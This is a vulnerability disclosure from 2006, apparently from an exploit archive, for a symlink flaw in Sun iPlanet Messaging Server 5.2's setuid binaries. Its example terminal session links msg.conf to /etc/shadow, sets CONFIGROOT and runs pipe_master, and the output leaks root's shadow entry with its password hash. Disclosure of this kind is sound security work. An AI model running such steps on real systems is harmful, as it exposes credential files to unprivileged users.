@@ -1,0 +1,56 @@
+Date: 14 Jun 2006
+Vendor: Sun Microsystems, Inc.
+Name: iPlanet Messaging Server
+Version: 5.2 HotFix 1.16 (built May 14 2003)
+Vuln: msg.conf symlink attack
+Severity: high
+
+
+Software description
+----------------
+The iPlanet Messaging Server is a software product that provides a
+centralized location for the exchange of information through the sending
+and receiving of messages. The product is designed for
+telecommunications providers, service providers, and enterprises that
+offer messaging capabilities to employees, partners, and customers. The
+iPlanet Messaging Server delivers a Web-based messaging platform capable
+of serving tens of millions of users, and also provides value-added
+differentiated services, including outsourcing, wireless ,and unified
+messaging services.
+
+
+Vulnerability desciption
+----------------
+Setuid programs part of the iPlanet Messaging Server try to read the
+configuration file msg.conf.
+If the environment variable CONFIGROOT is set, the configuration is read
+from that directory.
+A symlink attack is possible, and as a result it is possible to read the
+first line of any file with uid=0.
+
+Example
+----------------
+test@sunbox:/tmp$ /iplanet/iMS5/bin/msg/imta/bin/version
+iPlanet Messaging Server 5.2 HotFix 1.16 (built May 14 2003)
+libimta.so 5.2 HotFix 1.16 (built 12:32:17, May 14 2003)
+SunOS sunbox 5.9 Generic_118558-22 sun4u sparc SUNW,Sun-Fire-280R Solaris
+test@sunbox:/tmp$
+test@sunbox:/tmp$ ls -la /iplanet/iMS5/bin/msg/imta/bin/pipe_master
+-rws--s--x    1 root     mail       446864 Sep 22  2005 /iplanet/iMS5/bin/msg/imta/bin/pipe_master
+test@sunbox:/tmp$
+test@sunbox:/tmp$ ln -s /etc/shadow msg.conf
+test@sunbox:/tmp$
+test@sunbox:/tmp$ export CONFIGROOT=.
+test@sunbox:/tmp$
+test@sunbox:/tmp$ /iplanet/iMS5/bin/msg/imta/bin/pipe_master
+[14/Jun/2006:11:13:49 +0200] sunbox [119]: General Error: func=_configdrv_file_readoption; error=option name should be followed by '='; line=root:qW1HFEa1MCD0w:11821:::::: ERROR: Configuration database initialization failed - see default logfile
+test@sunbox:/tmp$
+
+Vulnerable
+----------------
+iPlanet Messaging Server 5.2 HotFix 1.16 (built May 14 2003)
+
+php0t / zorro.hu
+www.zorro.hu
+
+# milw0rm.com [2006-06-18]
